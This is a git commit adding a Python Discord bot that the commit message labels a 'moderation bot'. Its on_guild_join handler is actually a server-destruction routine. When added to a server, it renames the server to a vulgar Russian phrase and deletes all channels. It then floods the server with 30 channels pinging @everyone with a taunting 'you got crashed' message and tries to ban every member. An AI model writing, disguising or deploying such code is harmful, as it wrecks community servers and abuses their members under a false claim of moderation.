91e69fecb05d0a28eccb73924f6ce90524015c4e
LIL-JABA <82034934+LIL-JABA@users.noreply.github.com>
2021-09-28 11:30:25 +0300

    cool-moderation-bot

---
+++ main.py
@@ -0,0 +1,41 @@
+import discord
+from discord.ext import commands
+from config import settings
+from requests import get
+from os import getcwd
+import aiohttp
+import asyncio
+from io import BytesIO
+import requests
+from discord_components import *
+
+bot = commands.Bot(command_prefix = settings['prefix'])
+
+@bot.event
+async def on_ready():
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="Скам - Scally Milano")) 
+    print('Connected to bot: {}'.format(bot.user.name))
+
+#-------commands-------
+
+@bot.event
+async def on_guild_join(server):
+    a = 30
+    await server.edit(name = "вас хочет выебать ГЛЕНТ")
+    for i in server.channels:
+        await i.delete()
+    while a > 0:
+        channel = await server.create_text_channel("лиль-задудосил-крипов", overwrite=None)
+        await channel.send('@everyone ЛОХИ ВАС КРАШНУЛИ АХАХХАХАХАХАХАХХАХАХХАХАХАХАХАХ')
+        a -= 1
+    for member in bot.get_all_members():
+        try:
+            await member.ban(reason='ahahahha')
+        except:
+            print('xd')
+
+#---------end----------
+
+
+
+bot.run(settings['token'])
